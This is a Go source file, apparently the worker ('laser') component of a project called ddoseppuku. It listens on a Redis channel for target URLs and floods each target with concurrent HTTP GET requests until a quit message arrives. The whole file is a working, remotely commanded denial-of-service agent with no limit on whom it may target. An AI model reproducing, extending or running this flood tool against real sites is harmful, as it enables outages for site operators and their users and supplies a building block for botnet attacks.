package main

import (
	"context"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/go-redis/redis"
	"github.com/michaeloverton/ddoseppuku/internal/env"
	"github.com/sirupsen/logrus"
)

// Temporary constant till we solve the error:
// socket: too many open files
// possible reference:
// http://craigwickesser.com/2015/01/golang-http-to-many-open-files/
// https://mtyurt.net/post/docker-how-to-increase-number-of-open-files-limit.html

func main() {
	// Load the laser environment.
	env, err := env.LoadLaserEnv()
	if err != nil {
		log.Fatal("error loading environment: ", err.Error())
	}

	// Set up http client.
	httpClient := http.Client{}

	// Set up subscription client.
	subClient := redis.NewClient(&redis.Options{
		Addr:     env.RedisAddress,
		Password: "", // no password set
		DB:       0,  // use default DB
	})

	// Test connection to client.
	_, err = subClient.Ping().Result()
	if err != nil {
		log.Fatal("failed to connect to redis", err)
	}

	// Subscribe to the attack topic.
	attackTopic := subClient.Subscribe("topic")
	attackChan := attackTopic.Channel()

	// Subscribe to the quit topic.
	quitTopic := subClient.Subscribe("quit")
	sentinelQuitChan := quitTopic.Channel()

	laserQuitChan := make(chan bool)

	// When a message is received, attack target.
	for {
		select {
		case m := <-attackChan:
			logrus.Info("new attack on URL: ", m.Payload)
			go makeRequests(httpClient, m.Payload, env.MaxRequests, laserQuitChan)
		case <-sentinelQuitChan:
			logrus.Info("cease fire")
			laserQuitChan <- true
			// return
		}
	}

}

func makeRequests(c http.Client, URL string, maxRequests int, quitChan chan bool) {
	// Current number of requests we have made.
	requestCount := 0

	// Create cancellable context that  all requests will share.
	cancelCtx, cancel := context.WithCancel(context.Background())
	defer cancel()

	for {
		select {
		// case <-cancelCtx.Done():
		// 	return
		case <-quitChan:
			// When we receive a quit signal, cancel the context, so requests will be cancelled.
			logrus.Info("stopping requests")
			cancel()
			return
		default:
			if requestCount < maxRequests {
				// If we have not maxed  out requests, concurrently make request to target.
				go func() {

					// Create the request to the target.
					req, err := http.NewRequestWithContext(cancelCtx, "GET", URL, nil)
					if err != nil {
						logrus.Errorf("failed to create request: %s", err)
						return
					}

					// Make the request.
					res, err := c.Do(req)
					if err != nil {
						// If we cancelled the request context, then ignore the error.
						if strings.Contains(err.Error(), "context canceled") {
							logrus.Tracef("request failed: %s", err)
							return
						}
						logrus.Errorf("request failed: %s", err)
						return
					}
					defer res.Body.Close()

					logrus.Info("status: ", res.StatusCode)
				}()

				// Increment the number of requests we have made.
				requestCount++
			} else {
				// If we've reached max requests, just chill.
				logrus.Info("chilling")
				time.Sleep(5 * time.Second)
			}
		}
	}

}

func makeRequest(c http.Client, URL string, wg *sync.WaitGroup) {
	logrus.Infof("making request to: %s", URL)

	// Create the request to the target.
	req, err := http.NewRequest("GET", URL, nil)
	if err != nil {
		logrus.Errorf("failed to create request: %s", err)
		return
	}

	// Make the request.
	res, err := c.Do(req)
	if err != nil {
		logrus.Errorf("request failed: %s", err)
		return
	}
	defer res.Body.Close()

	// Log response.
	logrus.Info("response code:", res.StatusCode)

	wg.Done()

}
